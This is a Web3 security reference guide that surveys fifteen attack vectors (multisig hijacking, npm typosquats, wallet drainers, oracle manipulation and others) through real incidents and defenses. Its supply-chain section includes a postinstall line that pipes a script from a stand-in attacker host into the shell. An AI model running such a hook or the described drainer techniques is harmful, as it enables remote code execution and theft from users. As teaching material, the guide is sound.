# Web3 Attack Vectors Reference Guide
*Claris AI — V3.0 · OWASP Web3 Top 15 (2025) · Semper Fortis*

---

## Introduction

Web3 security in 2025 is defined by increasingly sophisticated attacks targeting the intersection of human trust, cryptographic systems, and decentralized infrastructure. The Bybit $1.5B heist (February 2025) demonstrated that even institutional-grade security can be defeated through UI layer manipulation. Total crypto losses from hacks and scams in 2024 exceeded $2.2 billion, with Q1 2025 already accounting for $1.8B due to the Bybit incident.

This guide covers OWASP Web3 Attack Vectors WA01–WA15 with real 2024–2025 examples, technical patterns, and actionable defenses.

---

## WA01 — Multisig Hijacking

**Severity: CRITICAL | 2025 Example: Bybit ($1.5B, Feb 2025)**

### The Bybit Incident
The largest crypto hack in history exploited Bybit's use of Safe{Wallet} (formerly Gnosis Safe). Attackers compromised the Safe{Wallet} frontend infrastructure and injected malicious JavaScript that displayed legitimate-looking transaction details while the actual on-chain transaction called a malicious implementation contract via `delegatecall`. Bybit's signers — using hardware wallets — approved what appeared to be a routine transaction, unknowingly signing a contract that transferred control of their $1.5B ETH cold wallet.

**Why This Works:**
Hardware wallets display data from the signing request, not the on-chain outcome. If the UI lies about what's being signed, hardware wallets cannot protect you. The `delegatecall` to a malicious contract updated the Safe's implementation, giving attackers permanent control.

**Technical Pattern:**
```
Attacker Controls: Safe Frontend JS
User Sees: "Regular transfer to 0xA...B (10 ETH)"
Contract Executes: delegatecall(malicious_impl).changeOwners([attacker])
Hardware Wallet Signs: ✓ (based on UI data, not on-chain outcome)
Result: Multisig now controlled by attacker
```

**Defenses:**
- Simulate every transaction with Tenderly or Etherscan before signing
- Use Firewall-enabled wallets that verify on-chain execution paths
- Implement mandatory time-locks on implementation changes (48h+)
- Cross-verify contract addresses from multiple independent sources
- Never sign from compromised or unfamiliar devices

---

## WA02 — Supply Chain Attacks (npm/PyPI)

**Severity: CRITICAL | 2023 Example: Ledger Connect Kit ($600K), 2024: Multiple npm packages**

### The Ledger Connect Kit Attack (Dec 2023)
A Ledger employee's NPMJS account was phished. Attackers published malicious versions of `@ledgerhq/connect-kit` that injected an asset drainer into any DApp importing the library. Hundreds of DApps were affected before detection. The malicious code executed when users connected wallets, draining all assets automatically.

**2024 Supply Chain Developments:**
- Multiple crypto-focused packages on PyPI contained credential stealers
- Typosquatting attacks targeting `web3.py` → `web3-py`, `ethers.js` → `etherjs`
- GitHub Actions workflow poisoning in open-source DeFi repos
- Compromised Solidity compilation tools silently modifying bytecode

**Attack Patterns:**
```
npm install ethers-helper    ← typosquat of 'ethers'
npm install web3utils        ← squatter of 'web3-utils'
postinstall: curl attacker.com/payload.sh | sh
```

**Defenses:**
- Pin exact dependency versions in lockfiles (`package-lock.json`, `poetry.lock`)
- Run `npm audit` and `pip-audit` in CI/CD
- Enable Dependabot security alerts
- Verify package checksums and publication history
- Use isolated build environments (Docker) that block outbound network
- Monitor for unexpected outbound connections from build processes

---

## WA03 — Private Key Compromise

**Severity: CRITICAL | Accounts for 43.8% of all stolen crypto funds**

### Scale of the Problem
Private key compromise is the single largest category of crypto theft. The 2024 Chainalysis Crypto Crime Report identified key compromise as responsible for $1.0B in losses. Attack sophistication ranges from simple phishing to nation-state-level malware operations (North Korea's Lazarus Group is attributed to multiple $100M+ key theft operations).

**Attack Methods:**
1. **Seed Phrase Phishing:** Fake MetaMask popups, fake Ledger support sites, Discord DMs claiming "verify your wallet"
2. **Clipboard Hijacking:** Malware monitors clipboard for wallet addresses and seed phrases
3. **Keyloggers:** Capture seed phrase entry or private key file access
4. **Browser Extension Attacks:** Malicious extensions with wallet permission intercept transactions
5. **Insecure Storage:** `.env` files in git repos, screenshots of seed phrases in cloud storage, seed phrase in password manager sync
6. **Insider Threats:** Compromised employees with key access

**Common Insecure Patterns:**
```bash
# Developer's .env file (accidentally committed):
PRIVATE_KEY=a1b2c3...64hexchars
MNEMONIC="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"

# These are now public if ever pushed to git
```

**Defenses:**
- Hardware wallets for all significant holdings (Ledger, Trezor, GridPlus)
- Air-gapped signing for institutional operations
- MPC (Multi-Party Computation) wallets eliminate single private key
- HSMs (Hardware Security Modules) for server-side signing
- Never enter seed phrase on any website — ever
- Revoke unnecessary token approvals regularly (revoke.cash)

---

## WA04 — Rugpull and Exit Scams

**Severity: HIGH | $1.3B lost in 2024**

### How Rugpulls Work
Developers deploy a seemingly legitimate DeFi protocol or token, accumulate user funds through marketing and early returns, then drain the liquidity and disappear. Hard rugpulls use admin functions coded into the contracts. Soft rugpulls involve token dumps after initial price manipulation.

**2024 Notable Rugpulls:**
- Magnate Finance: $6.4M exit scam with cloned Aave codebase
- ZKasino: $33M bridge scam where funds were "accidentally" moved to ETH staking
- Multiple "AI token" launches with anonymous teams and mint authorities

**Rugpull Indicators:**
- Anonymous team with no verifiable identity
- Unaudited contracts or audits from unknown firms
- Admin mint function with no cap
- Liquidity not locked (check Team Finance, Unicrypt)
- Excessive team token allocation (>15%)
- Renounced ownership not verifiable
- Copied codebase with minor modifications

---

## WA05 — Front-Running and MEV Exploitation

**Severity: HIGH | $1.38B MEV extracted in 2024**

Maximal Extractable Value (MEV) refers to profit extracted by reordering, inserting, or censoring transactions within blocks. Sandwich attacks buy before and sell after a victim's large DEX trade. JIT (just-in-time) liquidity attacks manipulate AMM pricing.

**Sandwich Attack Flow:**
```
Victim submits: Swap 10 ETH → USDC (slippage 0.5%)
Attacker sees in mempool:
  1. Buys ETH (front-run, drives price up)
  2. Victim's swap executes at worse price
  3. Attacker sells ETH (back-run, profits from spread)
Victim loses: ~$200-500 per $10K swap
```

**Defenses:** Use private RPC endpoints (Flashbots Protect, MEV Blocker). Set tight slippage (<0.5% for stable pairs). Use limit orders via CoW Protocol or 1inch Fusion. Large trades should be split.

---

## WA06 — Bridge Exploits

**Severity: CRITICAL | $2.1B lost to bridge hacks 2022-2024**

Cross-chain bridges are the highest-concentration attack targets in DeFi. They hold vast liquidity while relying on complex, often novel security models.

**Notable Bridge Hacks:**
- **Ronin Bridge (2022):** $625M — Compromised 5/9 validator keys (4 by spear-phishing + 1 via AxieDAO)
- **Nomad Bridge (2022):** $190M — Merkle root initialized to 0x0, allowing any message to be "proven" valid
- **Wormhole (2022):** $320M — Signature verification bypass allowed fake VAA (Verified Action Approvals)
- **Orbit Bridge (2024):** $82M — Private key compromise of bridge multisig

**Common Vulnerability Patterns:**
- Insufficient validator count or threshold (5/9 is too low)
- Single source of message verification truth
- Lack of finality requirements before releasing funds
- No rate limiting or circuit breakers on large withdrawals

---

## WA07 — Governance Attacks

**Severity: HIGH | Beanstalk $182M (2022), Ongoing in 2025**

### Flash Loan Governance Attack (Beanstalk)
Attacker borrowed $1B via Aave flash loan, used it to acquire a supermajority of Beanstalk governance tokens in one block, voted to pass a malicious "emergency" proposal that transferred all protocol funds to the attacker's wallet, repaid the flash loan. All in one transaction.

**Governance Attack Vectors:**
- Flash loan vote manipulation (single-block governance)
- Low quorum exploitation (pass proposals with minimal participation)
- Vote buying via bribing protocols (Votium, Hidden Hand)
- Proposal spam to create governance fatigue
- Delegate key compromise

**Defenses:** Snapshot voting (off-chain, flash-loan resistant). Time-lock between proposal and execution (48-72h). Meaningful quorum thresholds (>10% of circulating supply). Vote escrow (veToken) models that require long-term commitment.

---

## WA08 — Phishing and Social Engineering

**Severity: HIGH | $1.2B lost in 2024**

**2024-2025 Phishing Landscape:**
- Discord "NFT mint" announcements from compromised admin accounts
- Fake MetaMask "verification required" popups on DApp sites
- Twitter/X "official" support accounts DMing with "wallet recovery"
- Google Ads targeting "metamask", "phantom wallet", "uniswap" with malicious sites
- LinkedIn outreach with fake job offers containing malware

**Angel Drainer / Inferno Drainer (2024):**
Drainer kits sold as SaaS. Operators pay 20-30% of stolen funds to kit developers. Automated draining of all ERC-20, ERC-721, and ERC-1155 assets on connection. Stole $290M in 2023-2024 combined.

**Signs of Phishing:**
- Domain not exactly matching official (metarnask.io, uniswapp.org)
- Urgency language ("your wallet will be suspended")
- Requests to enter seed phrase anywhere
- Unexpected airdrop requiring "claim" wallet interaction

---

## WA09 — Oracle Manipulation

**Severity: CRITICAL | Mango Markets $114M (2022), Multiple incidents 2024**

**Mango Markets Attack:**
Attacker opened large MNGO perpetual positions on both sides, then massively bought MNGO spot price on low-liquidity exchanges to manipulate the oracle price, making their long position appear hugely profitable. Used the unrealized "profit" as collateral to borrow all protocol assets. Protocol used spot price as oracle with no manipulation resistance.

**Oracle Attack Categories:**
1. **Spot price manipulation:** Manipulate illiquid spot markets to affect oracle readings
2. **Chainlink oracle lag:** Exploit delay between real price and oracle update
3. **Off-chain oracle compromise:** Compromise the keys of oracle node operators
4. **TWAP manipulation:** Sustained price manipulation over oracle time window

**Secure Oracle Practices:**
- Use Chainlink with freshness check: `require(answeredInRound >= roundId)`
- Multi-source aggregation with outlier rejection
- Circuit breakers for >5% deviation in single block
- TWAP with ≥30 minute windows for AMM-based oracles

---

## WA10 — Wallet Drainers (Automated Asset Theft)

**Severity: CRITICAL | $300M+ stolen in 2024**

Drainer kits automate the theft of all assets from connected wallets through malicious smart contract approvals. They exploit the ERC-20 `permit()` function (EIP-2612) and `setApprovalForAll` for NFTs to drain assets with a single user signature.

**Drainer Techniques:**
- **Permit Phishing:** `permit(owner, drainer, maxUint256, deadline, v, r, s)` — transfers tokens without a separate approve transaction
- **SetApprovalForAll:** Grants drainer control of all NFTs in collection
- **Seaport Order Signing:** Victim signs an off-chain Seaport order selling all NFTs for 0 ETH

**Protection:**
- Use wallets with permit detection (Rabby, MetaMask with simulation)
- Revoke unlimited approvals immediately after use (revoke.cash)
- Use Pocket Universe or Fire browser extension for transaction simulation
- Hardware wallets alone do NOT protect against permit drainers

---

## WA11 — Smart Contract Backdoors

**Severity: CRITICAL | Multiple incidents annually**

Hidden malicious functionality in contracts that appear legitimate. Common in presale/fairlaunch tokens where deployed contracts differ from audited versions.

**Backdoor Categories:**
- Hidden mint functions with no emission cap
- Time-locked owner functions that activate after audit
- Proxy upgrade capabilities with no timelock
- `selfdestruct` accessible to owner/deployer
- CREATE2 pre-deployment swap (deploy malicious contract at same address as audited one)

**Verification Steps:**
1. Compare deployed bytecode hash against audited source compilation
2. Verify source code on Etherscan/Sourcify
3. Check proxy implementation address against announcement
4. Test on forked mainnet before significant interaction

---

## WA12 — NFT Phishing and Metadata Attacks

**Severity: MEDIUM | Ongoing**

NFTs used as phishing vectors: airdropped NFTs display approval dialogs when interacted with, fake collection mints with near-identical names to legitimate projects, IPFS metadata with malicious URLs.

---

## WA13 — Smart Contract Dependency Risks

**Severity: HIGH | Euler Finance $197M (2023), Curve reentrancy (2023)**

Curve Finance's Vyper compiler bug (2023) caused $70M in losses across protocols that used Vyper 0.2.15–0.3.0. The protocols themselves were not buggy — their compiler dependency was. This demonstrates cascading risk from shared infrastructure.

**Dependency Risk Mitigation:** Pin compiler versions. Test against dependency upgrades in isolation. Monitor security advisories for all upstream dependencies. Build integration tests that verify core dependency assumptions.

---

## WA14 — Insufficient Event Logging and Monitoring

**Severity: MEDIUM**

Protocols without robust event emission and off-chain monitoring detect attacks hours or days after they occur, maximizing damage. ChainSecurity estimates that 60% of protocol hacks had detectable on-chain precursors that would have triggered alerts with proper monitoring.

**Monitoring Stack:** Events → Tenderly Alerts / Forta Bots → PagerDuty → Response Runbook. Monitor for: unusual liquidity movements, governance proposals from new addresses, large single-transaction approvals, unexpected contract upgrades.

---

## WA15 — Cross-Site Scripting in Web3 UIs

**Severity: HIGH**

DApp frontends that render on-chain data without sanitization create XSS vulnerabilities. NFT names containing `<script>` tags, token descriptions with malicious HTML, and IPFS-hosted content rendered in app context can intercept wallet connections or modify transaction parameters.

**Affected Platforms (Historical):** OpenSea (NFT name XSS, 2021), Rarible (self-propagating NFT XSS), multiple ENS resolvers (metadata injection).

**Defenses:** Sanitize all on-chain data with DOMPurify before rendering. Set strict Content-Security-Policy headers. Render IPFS content in sandboxed iframes. Never use `innerHTML` or `dangerouslySetInnerHTML` with blockchain data.

---

## Defense-in-Depth Framework for Web3 Teams

### Pre-Deployment
1. Smart contract audit by reputable firm (not just one)
2. Formal verification for critical math
3. Economic security review (tokenomics attack surface)
4. Penetration testing of frontend and API layers
5. Supply chain audit of all dependencies

### Post-Deployment
1. Bug bounty program (Immunefi, HackerOne)
2. On-chain monitoring (Forta, Tenderly, Chainalysis)
3. Insurance (Nexus Mutual, InsurAce)
4. Incident response runbook pre-defined
5. Emergency pause mechanisms with timelocked multisig

### Ongoing
1. Regular dependency audits
2. Monitor for governance proposals
3. Track oracle price feeds
4. Subscribe to security mailing lists (DeFi Security Summit, BlockSec)

---

*Reference maintained by Claris AI · V3.0 · ~Claris*
